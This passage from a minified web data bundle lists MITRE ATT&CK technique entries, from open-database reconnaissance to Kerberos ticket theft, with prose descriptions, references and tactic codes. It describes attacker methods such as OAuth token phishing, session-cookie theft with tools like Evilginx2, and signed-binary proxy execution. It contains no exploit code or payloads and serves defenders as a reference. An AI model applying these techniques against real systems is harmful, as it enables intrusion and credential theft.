href='https:\u002F\u002Fmedium.com\u002F@menakajain\u002Fexport-download-ssl-certificate-from-server-site-url-bcfc41ea46a2'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.sslshopper.com\u002Fssl-checker.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.digitalshadows.com\u002Fblog-and-research\u002Fcontent-delivery-networks-cdns-can-leave-you-exposed-how-you-might-be-affected-and-what-you-can-do-about-it\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fshodan.io'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1199'\u003ETrusted Relationship\u003C\u002Fa\u003E).",external_references:[{source_name:b,external_id:aE,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596"},{source_name:aS,url:bF,description:bG},{source_name:az,url:aA,description:aB},{source_name:aT,url:aU,description:aV},{source_name:CR,url:CS,description:CT},{source_name:CU,url:CV,description:CW},{source_name:CX,url:CY,description:CZ},{source_name:C_,url:C$,description:Da}],tactics:[l],subtechniques:[Db,Dd,Df,Dh,Dj]},{id:du,"object-type":a,name:"Search Open Websites\u002FDomains",description:"Adversaries may search freely available websites and\u002For domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested\u002Frewarded contracts.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcyware.com\u002Fnews\u002Fhow-hackers-exploit-social-media-to-break-into-your-company-88e8da8e'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecuritytrails.com\u002Fblog\u002Fgoogle-hacking-techniques'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.exploit-db.com\u002Fgoogle-hacking-database'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E).",external_references:[{source_name:b,external_id:du,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593"},{source_name:Dl,url:Dm,description:Dn},{source_name:Do,url:Dp,description:Dq},{source_name:Dr,url:Ds,description:Dt}],tactics:[l],subtechniques:[Du,Dw]},{id:gr,"object-type":a,name:"Search Victim-Owned Websites",description:"Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments\u002Fdivisions, physical locations, and data about key employees such as names, roles, and contact info (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1589\u002F002'\u003EEmail Addresses\u003C\u002Fa\u003E). These sites may also have details highlighting business operations and relationships.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.comparitech.com\u002Fblog\u002Fvpn-privacy\u002F350-million-customer-records-exposed-online\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1199'\u003ETrusted Relationship\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E).",external_references:[{source_name:b,external_id:gr,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594"},{source_name:"Comparitech Leak",url:"https:\u002F\u002Fwww.comparitech.com\u002Fblog\u002Fvpn-privacy\u002F350-million-customer-records-exposed-online\u002F",description:"Bischoff, P. (2020, October 15). Broadvoice database of more than 350 million customer records exposed online. Retrieved October 20, 2020."}],tactics:[l]},{id:bT,"object-type":a,name:"Server Software Component",description:"Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.",external_references:[{source_name:b,external_id:bT,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1505"},{url:Dy,description:Dz,source_name:DA}],tactics:[k],subtechniques:[DB,DD,DF]},{id:DH,"object-type":a,name:"Service Stop",description:"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.talosintelligence.com\u002F2018\u002F02\u002Folympic-destroyer.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.operationblockbuster.com\u002Fwp-content\u002Fuploads\u002F2016\u002F02\u002FOperation-Blockbuster-Report.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as \u003Ccode\u003EMSExchangeIS\u003C\u002Fcode\u003E, which will make Exchange content inaccessible \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.operationblockbuster.com\u002Fwp-content\u002Fuploads\u002F2016\u002F02\u002FOperation-Blockbuster-Report.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. In some cases, adversaries may stop or disable many or all services to render systems unusable.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.talosintelligence.com\u002F2018\u002F02\u002Folympic-destroyer.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1485'\u003EData Destruction\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1486'\u003EData Encrypted for Impact\u003C\u002Fa\u003E on the data stores of services like Exchange and SQL Server.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.secureworks.com\u002Fresearch\u002Fwcry-ransomware-analysis'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{external_id:DH,source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1489"},{source_name:bs,url:bt,description:bu},{source_name:e$,description:fa,url:fb},{source_name:"SecureWorks WannaCry Analysis",url:"https:\u002F\u002Fwww.secureworks.com\u002Fresearch\u002Fwcry-ransomware-analysis",description:"Counter Threat Unit Research Team. (2017, May 18). WCry Ransomware Analysis. Retrieved March 26, 2019."}],tactics:[j]},{id:DI,"object-type":a,name:"Shared Modules",description:"Adversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1106'\u003ENative API\u003C\u002Fa\u003E which is called from functions like \u003Ccode\u003ECreateProcess\u003C\u002Fcode\u003E, \u003Ccode\u003ELoadLibrary\u003C\u002Fcode\u003E, etc. of the Win32 API. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FMicrosoft_Windows_library_files'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThe module loader can load DLLs:\n\n* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\n    \n* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\n    \n* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\n    \n* via \u003Ccode\u003E&#x3c;file name=\"filename.extension\" loadFrom=\"fully-qualified or relative pathname\"&#x3e;\u003C\u002Fcode\u003E in an embedded or external \"application manifest\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\n\nAdversaries may use this functionality as a way to execute arbitrary code on a victim system. For example, malware may execute share modules to load additional components or features.",external_references:[{source_name:b,external_id:DI,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1129"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FMicrosoft_Windows_library_files",description:"Wikipedia. (2017, January 31). Microsoft Windows library files. Retrieved February 13, 2017.",source_name:"Wikipedia Windows Library Files"}],tactics:[p]},{id:DJ,"object-type":a,name:"Shared Webroot",description:"**This technique has been deprecated and should no longer be used.**\n\nAdversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory \u003Csup\u003E\u003Ca href='undefined'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002Fhttpd.apache.org\u002Fdocs\u002F2.4\u002Fgetting-started.html#content'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.\n\nThis mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.webroot.com\u002Fblog\u002F2011\u002F02\u002F22\u002Fmalicious-php-scripts-on-the-rise\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:DJ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1051"},{external_id:"CAPEC-563",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F563.html"},{description:"Microsoft. (2016, October 20). How to: Find the Web Application Root. Retrieved July 27, 2018.",source_name:"Microsoft Web Root OCT 2016"},{url:"http:\u002F\u002Fhttpd.apache.org\u002Fdocs\u002F2.4\u002Fgetting-started.html#content",description:"Apache. (n.d.). Apache HTTP Server Version 2.4 Documentation - Web Site Content. Retrieved July 27, 2018.",source_name:"Apache Server 2018"},{url:"https:\u002F\u002Fwww.webroot.com\u002Fblog\u002F2011\u002F02\u002F22\u002Fmalicious-php-scripts-on-the-rise\u002F",description:"Brandt, Andrew. (2011, February 22). Malicious PHP Scripts on the Rise. Retrieved October 3, 2018.",source_name:"Webroot PHP 2011"}],tactics:[x]},{id:H,"object-type":a,name:"Signed Binary Proxy Execution",description:"Adversaries may bypass process and\u002For signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.",external_references:[{source_name:b,external_id:H,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218"}],tactics:[d],subtechniques:[DK,DP,DR,DU,DW,D$,Eb,Ed,Ef,Eh,Ej]},{id:gs,"object-type":a,name:"Signed Script Proxy Execution",description:"Adversaries may use scripts signed with trusted certificates to proxy execution of malicious files. Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fapi0cradle\u002FUltimateAppLockerByPassList'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:gs,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1216"},{url:DM,description:DN,source_name:DO}],tactics:[d],subtechniques:[El]},{id:En,"object-type":a,name:"Software Deployment Tools",description:"Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).\n\nAccess to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.",external_references:[{source_name:b,external_id:En,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1072"},{external_id:"CAPEC-187",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F187.html"}],tactics:[p,x]},{id:gt,"object-type":a,name:"Software Discovery",description:"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1518'\u003ESoftware Discovery\u003C\u002Fa\u003E during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\u002For attempts specific actions.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1068'\u003EExploitation for Privilege Escalation\u003C\u002Fa\u003E.",external_references:[{source_name:b,external_id:gt,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1518"},{external_id:"CAPEC-580",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F580.html"}],tactics:[i],subtechniques:[Eo]},{id:Eq,"object-type":a,name:"Source",description:"**This technique has been deprecated and should no longer be used.**\n\nThe \u003Ccode\u003Esource\u003C\u002Fcode\u003E command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways \u003Ccode\u003Esource \u002Fpath\u002Fto\u002Ffilename [arguments]\u003C\u002Fcode\u003E or \u003Ccode\u003E.**This technique has been deprecated and should no longer be used.** \u002Fpath\u002Fto\u002Ffilename [arguments]\u003C\u002Fcode\u003E. Take note of the space after the \".\". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fss64.com\u002Fbash\u002Fsource.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.",external_references:[{source_name:b,external_id:Eq,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1153"},{source_name:"Source Manual",url:"https:\u002F\u002Fss64.com\u002Fbash\u002Fsource.html",description:"ss64. (n.d.). Source or Dot Operator. Retrieved May 21, 2019."}],tactics:[p]},{id:aF,"object-type":a,name:"Stage Capabilities",description:"Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E) or obtained (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased\u002Frented by the adversary (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E) or was otherwise compromised by them (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E). Capabilities can also be staged on web services, such as GitHub or Pastebin.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2020\u002F11\u002F06\u002Foceanlotus-extending-cyber-espionage-operations-through-fake-websites\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nStaging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):\n\n* Staging web resources necessary to conduct \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189'\u003EDrive-by Compromise\u003C\u002Fa\u003E when a user browses to a site.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2012\u002F12\u002Fcouncil-foreign-relations-water-hole-attack-details.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Farstechnica.com\u002Fsecurity\u002F2015\u002F08\u002Fnewly-discovered-chinese-hacking-group-hacked-100-websites-to-use-as-watering-holes\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcybersecurity.att.com\u002Fblogs\u002Flabs-research\u002Fscanbox-a-reconnaissance-framework-used-on-watering-hole-attacks'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n* Staging web resources for a link target to be used with spearphishing.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002Fmalwarebytes-news\u002F2020\u002F10\u002Fsilent-librarian-apt-phishing-attack\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.proofpoint.com\u002Fus\u002Fthreat-insight\u002Fpost\u002Fthreat-actor-profile-ta407-silent-librarian'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n* Uploading malware or tools to a location accessible to a victim network to enable \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1105'\u003EIngress Tool Transfer\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2020\u002F11\u002F06\u002Foceanlotus-extending-cyber-espionage-operations-through-fake-websites\u002F'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n* Installing a previously acquired SSL\u002FTLS certificate to use to encrypt command and control traffic (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1573\u002F002'\u003EAsymmetric Cryptography\u003C\u002Fa\u003E with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1071\u002F001'\u003EWeb Protocols\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.digicert.com\u002Fkb\u002Fssl-certificate-installation.htm'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:aF,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1608"},{source_name:Er,url:Es,description:Et},{source_name:d_,url:d$,description:ea},{source_name:Eu,description:Ev,url:Ew},{source_name:aw,url:ax,description:ay},{source_name:Ex,url:Ey,description:Ez},{source_name:EA,url:EB,description:EC},{source_name:ED,url:EE,description:EF}],tactics:[e],subtechniques:[EG,EI,EK,EM,EO]},{id:EQ,"object-type":a,name:"Steal Application Access Token",description:"Adversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources. This can occur through social engineering and typically requires user action to grant access.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fauth0.com\u002Fblog\u002Fwhy-should-use-accesstokens-to-secure-an-api\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Fdevelop\u002Factive-directory-v2-protocols'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Fdevelop\u002Fv2-oauth2-auth-code-flow'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \n \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Fdevelop\u002Fquickstart-register-app'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Then, they can send a link through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F002'\u003ESpearphishing Link\u003C\u002Fa\u003E to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F001'\u003EApplication Access Token\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Fdevelop\u002Faccess-tokens'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries have been seen targeting Gmail, Microsoft Outlook, and Yahoo Mail users.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.amnesty.org\u002Fen\u002Flatest\u002Fresearch\u002F2019\u002F08\u002Fevolving-phishing-attacks-targeting-journalists-and-human-rights-defenders-from-the-middle-east-and-north-africa\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fpawn-storm-abuses-open-authentication-advanced-social-engineering-attacks'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1528",source_name:b,external_id:EQ},{description:ER,url:ES,source_name:ET},{description:"Microsoft. (n.d.). Retrieved September 12, 2019.",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Fdevelop\u002Factive-directory-v2-protocols",source_name:"Microsoft Identity Platform Protocols May 2019"},{description:"Microsoft. (n.d.). Microsoft identity platform and OAuth 2.0 authorization code flow. Retrieved September 12, 2019.",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Fdevelop\u002Fv2-oauth2-auth-code-flow",source_name:"Microsoft - OAuth Code Authorization flow - June 2019"},{description:"Microsoft. (2019, May 8). Quickstart: Register an application with the Microsoft identity platform. Retrieved September 12, 2019.",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Fdevelop\u002Fquickstart-register-app",source_name:"Microsoft - Azure AD App Registration - May 2019"},{description:"Microsoft. (2019, August 29). Microsoft identity platform access tokens. Retrieved September 12, 2019.",url:EU,source_name:"Microsoft - Azure AD Identity Tokens - Aug 2019"},{description:"Amnesty International. (2019, August 16). Evolving Phishing Attacks Targeting Journalists and Human Rights Defenders from the Middle-East and North Africa. Retrieved October 8, 2019.",url:"https:\u002F\u002Fwww.amnesty.org\u002Fen\u002Flatest\u002Fresearch\u002F2019\u002F08\u002Fevolving-phishing-attacks-targeting-journalists-and-human-rights-defenders-from-the-middle-east-and-north-africa\u002F",source_name:"Amnesty OAuth Phishing Attacks, August 2019"},{description:Ac,url:Ab,source_name:Aa}],tactics:[r]},{id:EV,"object-type":a,name:"Steal Web Session Cookie",description:"An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwunderwuzzi23.github.io\u002Fblog\u002Fpassthecookie.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThere are several examples of malware targeting cookies from web browsers on the local system.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurelist.com\u002Fproject-tajmahal\u002F90240\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fmac-malware-steals-cryptocurrency-exchanges-cookies\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fkgretzky\u002Fevilginx2'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fmuraenateam\u002Fmuraena'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAfter an adversary acquires a valid cookie, they can then perform a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F004'\u003EWeb Session Cookie\u003C\u002Fa\u003E technique to login to the corresponding web application.",external_references:[{source_name:b,external_id:EV,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1539"},{description:cS,url:cT,source_name:cU},{source_name:"Kaspersky TajMahal April 2019",url:"https:\u002F\u002Fsecurelist.com\u002Fproject-tajmahal\u002F90240\u002F",description:"GReAT. (2019, April 10). Project TajMahal – a sophisticated new APT framework. Retrieved October 14, 2019."},{source_name:cV,url:cW,description:cX},{description:"Gretzky, Kuba. (2019, April 10). Retrieved October 8, 2019.",url:"https:\u002F\u002Fgithub.com\u002Fkgretzky\u002Fevilginx2",source_name:"Github evilginx2"},{source_name:"GitHub Mauraena",url:"https:\u002F\u002Fgithub.com\u002Fmuraenateam\u002Fmuraena",description:"Orrù, M., Trotta, G.. (2019, September 11). Muraena. Retrieved October 14, 2019."}],tactics:[r]},{id:bf,"object-type":a,name:"Steal or Forge Kerberos Tickets",description:"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F003'\u003EPass the Ticket\u003C\u002Fa\u003E. \n\nKerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=227'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Attackers may attempt to abuse 